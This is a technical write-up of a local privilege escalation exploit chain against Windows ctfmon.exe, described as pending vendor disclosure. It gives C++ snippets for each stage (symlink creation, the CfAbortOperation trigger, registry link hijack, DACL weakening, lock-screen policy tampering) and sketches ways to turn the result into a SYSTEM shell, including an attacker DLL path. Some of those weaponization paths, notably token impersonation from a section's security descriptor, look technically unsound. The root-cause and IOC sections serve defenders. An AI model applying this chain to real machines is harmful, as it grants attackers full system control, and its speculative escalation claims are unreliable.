# GreenPlasma — CTFMON Arbitrary Section Creation EoP

## Vulnerability Summary

**Component:** `ctfmon.exe` (CTF Monitor / Windows Text Services Framework)  
**Class:** Arbitrary Section Creation → Privilege Escalation  
**Impact:** Local Privilege Escalation (Standard User → SYSTEM)  
**Affected:** Windows 11, Windows Server 2022, Windows Server 2026 (unconfirmed on Windows 10)  
**Type:** Logic bug / TOCTOU in object namespace handling  
**Disclosure Status:** Pending Microsoft MSRC

---

## Exploit Chain Overview

```
Standard User
    │
    ▼
1. Create Object Manager symlink: CTF.AsmListCache.FMPWinlogon<SessionID>
    → Redirects to attacker-controlled target
    │
    ▼
2. Trigger ctfmon.exe elevation via CfAbortOperation(cldapi.dll)
    → Ctfmon creates section at symlink path (as SYSTEM)
    │
    ▼
3. Hijack registry via CloudFiles\BlockedApps symlink
    → Points to current user's Policies\System key
    │
    ▼
4. Relax DACLs on hijacked registry keys (Everyone: GENERIC_ALL)
    → Enables writing to SYSTEM-trusted policy paths
    │
    ▼
5. Set DisableLockWorkstation = 1 via hijacked policy
    → Prevents lock screen, maintains access
    │
    ▼
6. Open handle to newly created SYSTEM section
    → Attacker holds writable section in SYSTEM-trusted namespace
    │
    ▼
7. WEAPONIZE: Write controlled data to SYSTEM section
    → Achieve arbitrary code execution as SYSTEM
```

---

## Stage-by-Stage Technical Analysis

### Stage 1: Object Manager Symlink Creation

```cpp
wsprintf(smpath, L"\\Sessions\\%d\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%d", sesid, sesid);
wchar_t* ptarget = argc == 2 ? argv[1] : (wchar_t*)L"\\BaseNamedObjects\\CTFMON_DEAD";

RtlInitUnicodeString(&linksrc, smpath);
RtlInitUnicodeString(&linktarget, ptarget);
NTSTATUS stat = _NtCreateSymbolicLinkObject(&hlnk, GENERIC_ALL, &objattr, &linktarget);
```

**What it does:** Creates a NT Object Manager symbolic link at the path where `ctfmon.exe` will later create its `CTF.AsmListCache` section object. The link redirects to an attacker-controlled path (`\BaseNamedObjects\CTFMON_DEAD` by default, or a custom target via argv[1]).

**Why it works:** `ctfmon.exe` does not check for existing symbolic links before creating its section. When it calls `NtCreateSection`, the Object Manager follows the symlink and creates the section at the *target* path instead, with SYSTEM-level permissions.

**Session ID guard:**
```cpp
if (!ProcessIdToSessionId(GetCurrentProcessId(), &sesid)) ...
if (!sesid) { printf("Seriously...?\n"); return 1; }
```
Ensures the exploit runs in a user session (not Session 0 / SERVICE context).

### Stage 2: Ctfmon Elevation Trigger (CfAbortOperation)

```cpp
CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
```

**What it does:** Calls `CfAbortOperation` from `cldapi.dll` (Cloud Files API) with flag `0x2`. This triggers Windows to restart/re-elevate `ctfmon.exe` in the current session.

**Why it matters:** When ctfmon restarts in an elevated context (SYSTEM), it attempts to recreate the `CTF.AsmListCache` section. Because the symlink is already in place (Stage 1), ctfmon creates the section at the symlink *target* with SYSTEM-level trust.

**The race window:**
```cpp
do {
    _NtOpenSection(&hmapping, MAXIMUM_ALLOWED, &objattr);
} while (!hmapping);
```
The exploit polls until the section appears — ctfmon has created it as SYSTEM.

### Stage 3: Registry Symlink Hijack

```cpp
res = RegCreateKeyEx(HKEY_CURRENT_USER, 
    L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
    NULL, NULL, 
    REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,  // ← Symbolic link!
    KEY_ALL_ACCESS, NULL, &hk, NULL);
```

**What it does:** Creates a volatile registry symbolic link at `HKCU\Software\Policies\Microsoft\CloudFiles\BlockedApps`. The `REG_OPTION_CREATE_LINK` flag makes this a registry link (similar to NTFS symlinks but for the registry).

**The target:**
```cpp
wsprintf(linktarget, L"\\REGISTRY\\USER\\%ws\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", stringSid);
```
Points to the current user's `Policies\System` key — a key that controls lock screen policy.

**Why it works:** Windows' Cloud Files infrastructure reads `BlockedApps` policy. When `CfAbortOperation` triggers ctfmon's policy evaluation, it follows the registry symlink and writes/reads to/from `Policies\System` instead of `BlockedApps`.

### Stage 4: DACL Relaxation

```cpp
// Step 1: Grant Everyone GENERIC_ALL on CloudFiles policy
TreeSetNamedSecurityInfo(L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles", ...);

// Step 2: Grant Everyone GENERIC_ALL on Policies\\System (via symlink)
TreeSetNamedSecurityInfo(L"CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", ...);
```

**What it does:** Uses `TreeSetNamedSecurityInfo` to grant `Everyone` `GENERIC_ALL` on both registry keys. This ensures any process (even low-integrity) can write to these keys.

**Why it matters:** The `Policies\System` key controls lock workstation behavior. By making it world-writable, the attacker can modify it even from a constrained context.

### Stage 5: DisableLockWorkstation

```cpp
DWORD val = 1;
RegSetValueEx(hk, L"DisableLockWorkstation", NULL, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
```

**What it does:** Sets `DisableLockWorkstation = 1` in the hijacked `Policies\System` key. This prevents the Windows lock screen from activating, ensuring the attacker maintains interactive access.

**Defensive loop:**
```cpp
do {
    Sleep(20);
    HDESK dsk = OpenInputDesktop(NULL, NULL, GENERIC_ALL);
    if (!dsk || dsk == INVALID_HANDLE_VALUE) break;
    CloseDesktop(dsk);
} while (1);
LockWorkStation();
```
Continuously monitors the desktop until the session becomes interactive, then locks the workstation (now controlled by attacker policy).

### Stage 6: Section Handle Retention

```cpp
_NtOpenSection(&hmapping, MAXIMUM_ALLOWED, &objattr);
```

**What it does:** Opens a handle to the section that `ctfmon` created as SYSTEM. The attacker now holds a `MAXIMUM_ALLOWED` handle to a section object that:
1. Was created by a SYSTEM process
2. Exists in a SYSTEM-trusted namespace path
3. Can be mapped, read, and written by the attacker

```cpp
printf("Section handle : 0x%x\n", hmapping);
printf("Press any button to close section and exit\n");
_getch();
CloseHandle(hmapping);
```

The handle is held open, preventing ctfmon from recreating the section and giving the attacker persistent access to the shared memory.

---

## Stage 7: Weaponization (SYSTEM Shell)

The original author stripped this portion. Here are the attack paths:

### Path A: Section Data Injection → SYSTEM Service Code Execution

**Concept:** The `CTF.AsmListCache` section is read by ctfmon and other SYSTEM services. By writing controlled data:
1. Map the section into the attacker's process with `NtMapViewOfSection`
2. Write a crafted payload (e.g., DLL path, COM object reference, or function pointer table)
3. Signal or trigger the SYSTEM service to read and process the section data
4. The SYSTEM service trusts the section content (it was "created by ctfmon") and executes the payload

### Path B: DLL Search Order Hijacking via Section Data

**Concept:** Some SYSTEM services read paths from shared memory sections:
1. Write a DLL path (e.g., `C:\Temp\evil.dll`) into the section
2. When a SYSTEM service reads the section and interprets the path as a module to load, it loads the attacker's DLL as SYSTEM
3. The DLL executes `cmd.exe` with SYSTEM privileges

### Path C: COM Object Registration via Registry + Section

**Concept:** Combine the registry hijack (Stage 3) with the section data:
1. Write COM class registration data into the section
2. Modify the registry via the hijacked `Policies\System` to point a COM handler to an attacker-controlled DLL
3. Trigger COM activation to load the DLL as SYSTEM

### Path D: Token Impersonation via Section Handle

**Concept:** The section was created by SYSTEM. Some Windows APIs allow querying the security context of section objects:
1. Use `NtQuerySecurityObject` on the section to extract SYSTEM token information
2. Use the section's security descriptor to craft a token impersonation
3. Call `ImpersonateNamedPipeClient` or similar with the impersonated SYSTEM token

---

## Root Cause Analysis

The core vulnerability is a **missing symbolic link check** in `ctfmon.exe`:

1. **No link validation:** When `ctfmon` calls `NtCreateSection` for `CTF.AsmListCache.FMPWinlogonN`, it does not verify that the path is a symbolic link before creating the section.
2. **Trust inheritance:** The section inherits SYSTEM-level trust because it was created by a SYSTEM process, even though a standard user redirected its creation path.
3. **Registry symlink trust:** `CfAbortOperation` and the Cloud Files policy engine follow registry symlinks without validation, enabling cross-key policy hijacking.

**The fix:** `ctfmon` should check for existing symbolic links at the target path before creating section objects, and the Cloud Files policy engine should not follow registry symlinks.

---

## Indicators of Compromise (IOCs)

- Object Manager symlink at `\Sessions\*\BaseNamedObjects\CTF.AsmListCache.FMPWinlogon*` pointing to a non-standard target
- Volatile registry key at `HKCU\Software\Policies\Microsoft\CloudFiles\BlockedApps` with `REG_OPTION_CREATE_LINK`
- `DisableLockWorkstation = 1` set in `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`
- `Everyone: GENERIC_ALL` ACE on `HKCU\Software\Policies\Microsoft\CloudFiles` or `Policies\System`
- Unusual `CfAbortOperation` calls from non-Cloud Files processes
- Section handle opened by a standard user process at `\BaseNamedObjects\CTFMON_DEAD`

---

## References

- Windows Object Manager Symbolic Links: `NtCreateSymbolicLinkObject`
- Registry Symbolic Links: `REG_OPTION_CREATE_LINK`
- Cloud Files API: `cldapi.dll!CfAbortOperation`
- CTF Monitor: `ctfmon.exe` (Text Services Framework)
- `TreeSetNamedSecurityInfo`: DACL manipulation API